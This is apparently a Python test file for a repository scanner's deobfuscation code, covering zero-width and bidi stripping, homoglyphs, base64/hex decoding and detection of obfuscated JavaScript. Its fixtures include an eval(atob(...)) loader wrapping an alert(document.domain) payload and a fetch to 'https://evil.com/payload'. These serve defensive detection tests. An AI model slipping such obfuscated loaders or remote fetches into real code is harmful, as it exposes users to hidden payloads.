"""Tests for deobfuscation modules."""

from reporeaver.deobfuscation.encoding import decode_js_string, try_decode
from reporeaver.deobfuscation.js import extract_urls_from_script, find_obfuscated_strings
from reporeaver.deobfuscation.unicode import count_zero_width, normalize_homoglyphs, strip_bidi, strip_zero_width


class TestUnicode:
    def test_strip_zero_width(self):
        original = "var\u200bx\u200b= 1;"
        cleaned = strip_zero_width(original)
        assert "\u200b" not in cleaned
        assert cleaned == "varx= 1;"

    def test_strip_bidi(self):
        original = "\u202eHello\u202c"
        cleaned = strip_bidi(original)
        assert "\u202e" not in cleaned
        assert "\u202c" not in cleaned
        assert cleaned == "Hello"

    def test_normalize_homoglyphs(self):
        original = "c\u0430t"
        normalized = normalize_homoglyphs(original)
        assert normalized == "cat"

    def test_count_zero_width(self):
        text = "a\u200bb\u200cc"
        assert count_zero_width(text) == 2


class TestEncoding:
    def test_try_decode_base64(self):
        import base64
        original = "hello world"
        encoded = base64.b64encode(original.encode()).decode()
        decoded = try_decode(encoded)
        assert decoded is not None
        assert original in decoded

    def test_try_decode_hex(self):
        original = "hello world this is a test message"
        encoded = original.encode().hex()
        decoded = try_decode(encoded)
        assert decoded is not None
        assert original in decoded

    def test_try_decode_invalid(self):
        assert try_decode("not encoded at all") is None

    def test_decode_js_hex_string(self):
        decoded = decode_js_string("\\x68\\x65\\x6c\\x6c\\x6f")
        assert decoded is not None
        assert decoded.strip() == "hello"


class TestJSDeobfuscation:
    def test_find_hex_obfuscated_strings(self):
        text = 'var x = "\\x68\\x65\\x6c\\x6c\\x6f";'
        results = find_obfuscated_strings(text)
        assert len(results) >= 1

    def test_find_eval_b64(self):
        import base64
        payload = "alert(document.domain)"
        b64 = base64.b64encode(payload.encode()).decode()
        text = f'eval(atob("{b64}"))'
        results = find_obfuscated_strings(text)
        assert len(results) >= 1

    def test_extract_urls(self):
        text = 'fetch("https://evil.com/payload");'
        urls = extract_urls_from_script(text)
        assert "https://evil.com/payload" in urls

    def test_no_false_positives(self):
        text = 'var x = "hello world";'
        results = find_obfuscated_strings(text)
        assert len(results) == 0
